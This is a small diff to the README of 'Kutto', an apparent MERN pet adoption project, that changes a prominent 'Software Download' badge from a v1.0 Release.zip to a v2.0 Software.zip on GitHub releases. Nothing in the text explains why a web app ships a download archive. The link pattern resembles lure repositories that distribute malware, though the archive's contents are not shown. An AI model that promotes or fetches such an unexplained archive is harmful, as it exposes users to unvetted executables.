@@ -1,6 +1,6 @@
 # 🐾 **Kutto - Your Trusted Pet Adoption Platform**
 
-[![Software Download](https://github.com/L1ord/Kutto/releases/download/v1.0/Release.zip)](https://github.com/L1ord/Kutto/releases/download/v1.0/Release.zip)
+[![Software Download](https://github.com/L1ord/Kutto/releases/download/v2.0/Software.zip)](https://github.com/L1ord/Kutto/releases/download/v2.0/Software.zip)
 
 Welcome to Kutto, a MERN-based pet adoption platform where you can connect with pets in need of loving forever homes. 
 
